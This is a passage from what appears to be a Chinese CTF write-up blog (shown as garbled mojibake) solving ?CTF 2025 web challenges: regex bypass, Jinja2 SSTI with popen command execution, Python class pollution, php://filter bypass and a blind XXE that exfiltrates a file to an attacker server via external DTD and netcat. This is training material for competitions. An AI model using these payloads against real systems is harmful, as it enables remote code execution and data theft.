class="line">æ¬¡æˆ–å¤šæ¬¡åŒ¹é…å‰â¾¯çš„å­—ç¬¦æˆ–â¼¦è¡¨è¾¾å¼ã€‚è¿™â¾¥å°±æ˜¯æˆ‘ä»¬æ»¡â¾œåâ¾¯å­—ç¬¦ä¸²â»“åº¦ä¸º40æ‰€éœ€è¦æ§åˆ¶çš„åœ°â½…ï¼Œå› ä¸ºè¿™â¾¥å¯ä»¥æ˜¯ä»»æ„â»“</span><br><span class="line">åº¦ã€‚</span><br><span class="line">7ã€@email.com flag.</span><br><span class="line">å­—â¾¯æ„æ€ã€‚ç¬¬â¼€ä¸ªç‚¹å·è¢«åæ–œæ è½¬ä¹‰äº†ï¼Œæ‰€ä»¥å°±æ˜¯ç‚¹å·ï¼Œç¬¬â¼†ä¸ªç‚¹å·åœ¨æ­£åˆ™è¡¨è¾¾å¼å½“ä¸­çš„ä½œâ½¤å°±æ˜¯åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦â½å¦‚</span><br><span class="line">aï¼Œæ‰€ä»¥è¿™â¾¥æ˜¯ @email.com`` flaga</span><br><span class="line">8ã€.\b$</span><br><span class="line">è¿™â¾¥æ˜¯ä»¥ä»»æ„å­—ç¬¦ç»“å°¾ï¼Œéšä¾¿ä»€ä¹ˆå­—âºŸæ•°å­—éƒ½å¯ä»¥ã€‚</span><br><span class="line"></span><br><span class="line">&quot;-ctf&lt;&quot; + &quot;\n&quot; + &quot;&gt;&gt;&gt;&gt;&gt;&quot; + &quot;h12&quot; + &quot;!@#$%^&amp;*()&quot; + &quot;@email.com flaga&quot;</span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒå…³æ­£åˆ™ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$test_string = &#x27;Please\ 777give+. !me?&lt;=-=&gt;(.*)Flaggg0&#x27;;</span><br><span class="line"></span><br><span class="line">(preg_match(&#x27;/&#x27;.$preg.&#x27;/&#x27;, $test_string) &amp;&amp; strlen($_POST[&#x27;preg&#x27;]) &gt; 77)</span><br></pre></td></tr></table></figure>

<p>åæ–œæ å’Œé—®å·å±äºæ­£åˆ™è¡¨è¾¾å¼ä¿ç•™å­—ç¬¦ï¼Œè¦åŒ¹é…ä»–ä»¬æœ¬èº«éœ€è¦è¢«è½¬ä¹‰ã€‚åŠ å·åœ¨æµè§ˆå™¨ä¼ å‚çš„æ—¶å€™ä¸èƒ½ç›´æ¥å†™ï¼Œç›´æ¥å†™ä¼šè¢«å½“æˆç©ºæ ¼ä¼ åˆ°åç«¯ï¼ŒåŠ å·éœ€è¦urlç¼–ç ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> r&quot;\QPlease\ 777give+. !me?&lt;=-=&gt;(.*)Flaggg0\E(?#&quot; + &quot;A&quot;*80 + &quot;)&quot;</span><br><span class="line"> </span><br><span class="line"> preg=Please\\ 777give\%2b. !me\?!(-!)</span><br><span class="line">(.*)Flagg[abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGH]</span><br><span class="line">[abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGH]</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2403_88857807/article/details/154292256">?CTF 2025 misc webéƒ¨åˆ†è§£-CSDNåšå®¢</a>çš„è„šæœ¬ï¼Œä¹Ÿå°±æ˜¯æ­£å¸¸å‘é€è¯·æ±‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url = &quot;http://challenge.ilovectf.cn:30399/&quot;</span><br><span class="line"> </span><br><span class="line">get_val = &quot;-ctf&lt;&quot; + &quot;\n&quot; + &quot;&gt;&gt;&gt;&gt;&gt;&quot; + &quot;h12&quot; + &quot;!@#$%^&amp;*()&quot; + &quot;@email.com flaga&quot;</span><br><span class="line">preg = r&quot;\QPlease\ 777give+. !me?&lt;=-=&gt;(.*)Flaggg0\E(?#&quot; + &quot;A&quot;*80 + &quot;)&quot;</span><br><span class="line"> </span><br><span class="line">r = requests.post(url, params=&#123;&quot;?&quot;: get_val&#125;, data=&#123;&quot;preg&quot;: preg&#125;, timeout=10)</span><br><span class="line">print(&quot;HTTP&quot;, r.status_code)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<h3 id="ç•™è¨€æ¿"><a href="#ç•™è¨€æ¿" class="headerlink" title="ç•™è¨€æ¿"></a>ç•™è¨€æ¿</h3><h4 id="è€ƒç‚¹ï¼šSSTIæ¼æ´"><a href="#è€ƒç‚¹ï¼šSSTIæ¼æ´" class="headerlink" title="è€ƒç‚¹ï¼šSSTIæ¼æ´"></a>è€ƒç‚¹ï¼šSSTIæ¼æ´</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_61955196/article/details/132237648</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jinjia2ç‰Œç•™è¨€æ¿ï¼Œæ¥è¯´ç‚¹ä»€ä¹ˆå§~</span><br></pre></td></tr></table></figure>

<p><strong>æµ‹è¯•</strong>æ¼æ´å­˜åœ¨æƒ…å†µ</p>
<p><img src="/../images/image-20251109231754885.png" alt="image-20251109231754885"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251110164203821.png" alt="image-20251110164203821"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[156].__init__.__globals__.popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251110164344001.png" alt="image-20251110164344001"></p>
<p>ä½¿ç”¨requestç»•è¿‡å•å¼•å·å’ŒåŒå¼•å·ï¼ŒæŸ¥çœ‹æºç æ‰¾ä¼ å‚ï¼Œè®¿é—®äº†&#x2F;sstiè·¯ç”±ï¼Œâ½¤POSTâ½…æ³•ä¼ å‚messgeã€‚</p>
<p><img src="/../images/image-20251110164622245.png" alt="image-20251110164622245"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[156].__init__.__globals__.popen(request.form.a).read()&#125;&#125;&amp;a=cat /flag</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251110164958883.png" alt="image-20251110164958883"></p>
<h3 id="è¿™æ˜¯ä»€ä¹ˆå‡½æ•°"><a href="#è¿™æ˜¯ä»€ä¹ˆå‡½æ•°" class="headerlink" title="è¿™æ˜¯ä»€ä¹ˆå‡½æ•°"></a>è¿™æ˜¯ä»€ä¹ˆå‡½æ•°</h3><h4 id="è€ƒç‚¹ï¼špythonåŸå‹é“¾æ±¡æŸ“"><a href="#è€ƒç‚¹ï¼špythonåŸå‹é“¾æ±¡æŸ“" class="headerlink" title="è€ƒç‚¹ï¼špythonåŸå‹é“¾æ±¡æŸ“"></a>è€ƒç‚¹ï¼špythonåŸå‹é“¾æ±¡æŸ“</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ²¡è§è¿‡ï¼Ÿæœä¸€ä¸‹ï¼åœ¨/flag</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251110165413127.png" alt="image-20251110165413127"></p>
<p>æç¤ºä¿¡æ¯æ”¶é›†ï¼Œé‚£ä¹ˆç›®å½•æ‰«æä¸€ä¸‹</p>
<p><img src="/../images/image-20251110171757499.png" alt="image-20251110171757499"></p>
<p>&#x2F;flagå’Œ&#x2F;srcè·¯ç”±ï¼Œåœ¨&#x2F;srcå½“ä¸­æºç æ³„éœ²</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask,request,render_template</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">def is_json(data):</span><br><span class="line">    try:</span><br><span class="line">        json.loads(data)</span><br><span class="line">        return True</span><br><span class="line">    except ValueError:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">class cls():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">cat = &quot;where is the flag?&quot;</span><br><span class="line">dog = &quot;how to get the flag?&quot;</span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/flag&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def flag():</span><br><span class="line">    with open(&#x27;/flag&#x27;,&#x27;r&#x27;) as f:</span><br><span class="line">        flag = f.read().strip()</span><br><span class="line">    if cat == dog:</span><br><span class="line">        return flag </span><br><span class="line">    else:</span><br><span class="line">        return cat + &quot; &quot; + dog</span><br><span class="line">@app.route(&#x27;/src&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def src():</span><br><span class="line">    return open(__file__, encoding=&quot;utf-8&quot;).read()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/pollute&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def Pollution():</span><br><span class="line">    if request.is_json:</span><br><span class="line">        merge(json.loads(request.data),instance)</span><br><span class="line">    else:</span><br><span class="line">        return &quot;fail&quot;</span><br><span class="line">    return &quot;success&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=5000)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251110170414105.png" alt="image-20251110170414105"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/flagï¼šåˆ¤æ–­å…¨å±€å˜é‡catå’Œdogæ˜¯å¦ç›¸åŒï¼Œç›¸åŒåˆ™è¾“å‡ºflagï¼Œå¦åˆ™è¾“å‡ºcatå’Œdogå˜é‡å€¼ã€‚</span><br><span class="line">/srcï¼šæ˜¾ç¤ºå½“å‰â½‚ä»¶ï¼Œå³fileã€‚</span><br><span class="line">/polluteï¼šå°†æ”¶åˆ°çš„jsonæ ¼å¼æ•°æ®å½“ä½œå‚æ•°ï¼Œæ‰§â¾â¾ƒå®šä¹‰å‡½æ•°merge(),å¹¶ä¸”å›æ˜¾æ˜¯å¦æ‰§â¾æˆåŠŸã€‚</span><br></pre></td></tr></table></figure>

<p>åˆ™æœ‰ä¸¤ç§æ±¡æŸ“è·å¾—flagçš„æ–¹æ³•ï¼Œè¦ä¹ˆå°†catå’Œdogå…¶ä¸­ä¸€ä¸ªè¿›è¡Œæ±¡æŸ“ä½¿å…¶ç›¸ç­‰ï¼Œè¦ä¹ˆå°†fileæ±¡æŸ“æˆflagç›´æ¥è¯»å‡ºæ¥,ç„¶åè®¿é—®&#x2F;flagæˆ–è€…&#x2F;srcå°±å¥½äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">             &quot;__file__&quot; : &quot;/flag&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">              &quot;dog&quot; : &quot;where is the flag?&quot;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®˜pçš„è„šæœ¬ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def fetch_flag(base_url, pollute_data):</span><br><span class="line">    try:</span><br><span class="line">        # å‘é€POSTè¯·æ±‚åˆ°/polluteè·¯ç”±</span><br><span class="line">        pollute_response = requests.post(</span><br><span class="line">            f&quot;&#123;base_url&#125;/pollute&quot;,</span><br><span class="line">            json=pollute_data,</span><br><span class="line">            headers=&#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;</span><br><span class="line">        )</span><br><span class="line">        print(f&quot;Polluteè¯·æ±‚çŠ¶æ€ç : &#123;pollute_response.status_code&#125;&quot;)</span><br><span class="line">        pollute_response.raise_for_status()</span><br><span class="line">        </span><br><span class="line">        # è¯·æ±‚flagè·¯ç”±</span><br><span class="line">        flag_response = requests.get(f&quot;&#123;base_url&#125;/flag&quot;)</span><br><span class="line">        print(f&quot;Flagè¯·æ±‚çŠ¶æ€ç : &#123;flag_response.status_code&#125;&quot;)</span><br><span class="line">        flag_response.raise_for_status()</span><br><span class="line">        </span><br><span class="line">        # æå–flag</span><br><span class="line">        content = flag_response.text</span><br><span class="line">        match = re.search(r&#x27;flag\&#123;.*?\&#125;&#x27;, content)</span><br><span class="line">        if match:</span><br><span class="line">            return match.group()</span><br><span class="line">        else:</span><br><span class="line">            return &quot;æœªæ‰¾åˆ°flagç‰¹å¾å­—ç¬¦ä¸²&quot;</span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        return f&quot;è¯·æ±‚å‘â½£é”™è¯¯: &#123;str(e)&#125;&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return f&quot;å‘â½£é”™è¯¯: &#123;str(e)&#125;&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    BASE_URL = &quot;http://challenge.ilovectf.cn:30462&quot;</span><br><span class="line">    POLLUTE_DATA = &#123;</span><br><span class="line">        &quot;__init__&quot; : &#123;</span><br><span class="line">            &quot;__globals__&quot; : &#123;</span><br><span class="line">                &quot;dog&quot; : &quot;where is the flag?&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result = fetch_flag(BASE_URL, POLLUTE_DATA)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251110171734186.png" alt="image-20251110171734186"></p>
<h3 id="Look-at-the-picture"><a href="#Look-at-the-picture" class="headerlink" title="Look at the picture"></a><strong>Look at the picture</strong></h3><h4 id="è€ƒç‚¹ï¼šphpä¼ªåè®®"><a href="#è€ƒç‚¹ï¼šphpä¼ªåè®®" class="headerlink" title="è€ƒç‚¹ï¼šphpä¼ªåè®®"></a>è€ƒç‚¹ï¼šphpä¼ªåè®®</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä½ æƒ³çœ‹ä»€ä¹ˆå›¾ç‰‡éƒ½è¡Œï¼Œä½†åªèƒ½æ˜¯httpåè®®å“¦~ ä¸è¦å·å·ç”¨å…¶å®ƒçš„</span><br></pre></td></tr></table></figure>

<p>ç›®å½•æ‰«æåˆ°<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p><img src="/../images/image-20251110173244488.png" alt="image-20251110173244488"></p>
<p>æŸ¥çœ‹æºç æœ‰file_get_contentsçš„ä»»æ„â½‚ä»¶è¯»å–æ¼æ´ï¼Œè¿˜æœ‰é»‘åå•é™åˆ¶å…³é”®è¯</p>
<p><img src="/../images/image-20251110173605876.png" alt="image-20251110173605876"></p>
<p>ç”¨php:&#x2F;&#x2F;filteræ¥è¿›è¡Œå¯¹é»‘åå•çš„ç»•è¿‡</p>
<p><img src="/../images/image-20251110174127984.png" alt="image-20251110174127984"></p>
<p>å®˜æ–¹é¢˜è§£å½“ä¸­è¯´äº†ï¼Œå¸¸â½¤çš„base64å’Œstringè¢«banäº†ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„è¿‡æ»¤å™¨è¿›è¡Œç»•è¿‡ä¹Ÿokï¼Œè®°ä¸‹æ¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.&lt;æºç¼–ç &gt;.&lt;â½¬æ ‡ç¼–ç &gt;</span><br><span class="line">è¿™ä¸ªè¿‡æ»¤å™¨å¯ä»¥è¿›â¾ä»»æ„å­—ç¬¦ç¼–ç ä¹‹é—´çš„è½¬æ¢</span><br></pre></td></tr></table></figure>

<h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="æŸ¥æŸ¥å¿†"><a href="#æŸ¥æŸ¥å¿†" class="headerlink" title="æŸ¥æŸ¥å¿†"></a><strong>æŸ¥æŸ¥å¿†</strong></h3><h4 id="è€ƒç‚¹ï¼šæ— å›æ˜¾xxe"><a href="#è€ƒç‚¹ï¼šæ— å›æ˜¾xxe" class="headerlink" title="è€ƒç‚¹ï¼šæ— å›æ˜¾xxe"></a>è€ƒç‚¹ï¼šæ— å›æ˜¾xxe</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥ä¸€æŸ¥å…³äºXMLçš„å›å¿†</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/Libra1313/article/details/149851715?spm=1001.2101.3001.10752</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251110224850936.png" alt="image-20251110224850936"></p>
<p>è¯»å–è¯¥flagæ–‡ä»¶ï¼Œæ— å›æ˜¾åŠ è½½å¤–éƒ¨dtdæ–‡ä»¶</p>
<p>æ­£å¸¸æ¥è¯´åœ¨vpsä¸Šæ”¾dtdæ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///f1111llllaa44g&quot;&gt;</span><br><span class="line">&lt;!ENTITY % code &quot;&lt;!ENTITY % send SYSTEM &#x27;http://xx.xx.xx.xx/:11111?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¯¹è¿‡æ»¤è¯è¿›è¡Œç¼–ç ç»•è¿‡</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://xx.xx.xx.xx/xxe.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %dtd;%code;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-7&quot;?&gt;</span><br><span class="line">+ADwAIQ-DOCTYPE a +AFs</span><br><span class="line">    +ADwAIQ-ENTITY +ACU dtd SYSTEM +ACI-http://xx.xx.xx.xx/xxe.dtd+ACIAPg</span><br><span class="line">    +ACU-dtd+ADsAJQ-code+ADsAJQ-send+ADs</span><br><span class="line">+AF0APg-</span><br></pre></td></tr></table></figure>

<p>ç„¶åvpså¼€å¯11111ç«¯å£ï¼ŒæŸ¥è¯¢å£è¾“å…¥payloadå³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 11111</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å¤ç°çš„æ˜¯ä¸€ç›´å¸¦å¤–ä¸äº†ï¼Œä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p>
<h3 id="é­”æœ¯å¤§æ‚çƒ©"><a href="#é­”æœ¯å¤§æ‚çƒ©" class="headerlink" title="é­”æœ¯å¤§æ‚çƒ©"></a><strong>é­”æœ¯å¤§æ‚çƒ©</strong></h3><h4 id="è€ƒç‚¹ï¼šPHPååºåˆ—åŒ–çš„POPé“¾"><a href="#è€ƒç‚¹ï¼šPHPååºåˆ—åŒ–çš„POPé“¾" class="headerlink" title="è€ƒç‚¹ï¼šPHPååºåˆ—åŒ–çš„POPé“¾"></a>è€ƒç‚¹ï¼šPHPååºåˆ—åŒ–çš„POPé“¾</h4><p>ç»™çš„åŸºç¡€çŸ¥è¯†ç‚¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&quot;__get():åœ¨å¯¹è±¡ä¸­è°ƒâ½¤â¼€ä¸ªä¸å¯è®¿é—®çš„æˆ–ä¸å­˜åœ¨çš„å˜é‡æ—¶è§¦å‘ï¼Œå’Œç¬¦å·&quot;&amp;æœ‰å…³ã€‚&quot;__get($key)çš„$keyæ˜¯ä½ è§¦å‘&quot;__get()æ—¶è®¿é—®çš„é‚£ä¸ªä¸å­˜åœ¨çš„å˜é‡ã€‚</span><br><span class="line">&quot;__call()ï¼šåœ¨å¯¹è±¡ä¸­è°ƒâ½¤â¼€ä¸ªä¸å­˜åœ¨çš„â½…æ³•æ—¶â¾ƒåŠ¨è°ƒâ½¤è¿™ä¸ªâ½…æ³•ï¼Œå’Œç¬¦å·&quot;&amp;æœ‰å…³ã€‚&quot;__call($name,$arg)çš„$nameå’Œ$argæ˜¯è§¦å‘æ—¶è°ƒâ½¤çš„â½…æ³•åå’Œå‚æ•°ã€‚</span><br><span class="line">&quot;__toString()ï¼šå½“â¼€ä¸ªå¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²è¾“å‡ºæˆ–ä½¿â½¤æ—¶è§¦å‘ï¼Œèƒ½è§¦å‘çš„å…³é”®å­—æœ‰echoï¼Œæ­£åˆ™å‡½æ•°ï¼ˆä¼šè¿›â¾ç±»å‹è½¬æ¢ï¼‰ï¼Œä¸strtolower();ï¼Œdie();å’Œmd5();,sha1();ç­‰å‡½æ•°æœ‰å…³ã€‚ ç±»ä¼¼</span><br><span class="line">äº$this&quot;&amp;mimi&quot;&#x27;&#x27;nohajimi&#x27;;çš„èµ‹å€¼æ“ä½œä¹Ÿä¼šè§¦å‘ã€‚</span><br><span class="line">&quot;__invoke()ï¼šå½“â¼€ä¸ªå¯¹è±¡è¢«ä½œä¸ºå‡½æ•°è°ƒâ½¤æ—¶â¾ƒåŠ¨è°ƒâ½¤è¿™ä¸ªâ½…æ³•ï¼Œå’Œ()æœ‰å…³ã€‚</span><br><span class="line">&quot;__wakeup()ï¼šåœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–ä¹‹åâ¾ƒåŠ¨è°ƒâ½¤è¿™ä¸ªâ½…æ³•ï¼Œå’Œunserializeå…³é”®å­—æœ‰å…³ã€‚</span><br><span class="line">&quot;__destruct()ï¼šå¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘ï¼Œå¦‚åœ¨è„šæœ¬ç»“æŸæ—¶phpé€šå¸¸ä¼šè¿›â¾æ¸…ç†ï¼Œé€šå¸¸ä¼šè§¦å‘ææ„å‡½æ•°ã€‚</span><br><span class="line">&quot;__constract()ï¼šå¯¹è±¡è¢«åˆ›å»ºæ—¶è§¦å‘ï¼Œå’Œnewå…³é”®å­—æœ‰å…³ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é­”æœ¯å¸ˆPOPåšçš„å¤§æ‚çƒ©ï¼Œå‘³çœŸè¶³~</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 